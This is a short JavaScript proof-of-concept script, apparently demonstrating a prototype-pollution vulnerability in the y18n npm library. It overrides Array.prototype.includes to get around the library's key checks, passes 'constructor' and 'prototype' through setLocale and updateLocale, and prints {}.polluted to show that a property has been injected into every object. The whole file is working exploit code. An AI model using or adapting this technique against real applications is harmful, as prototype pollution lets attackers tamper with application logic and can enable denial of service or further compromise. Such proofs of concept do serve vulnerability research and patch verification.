Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const y18n = require('y18n')();
obj = {};
console.log({}.polluted);
y18n.setLocale('constructor', 'prototype');
y18n.updateLocale({ polluted: 'yes' });
console.log({}.polluted);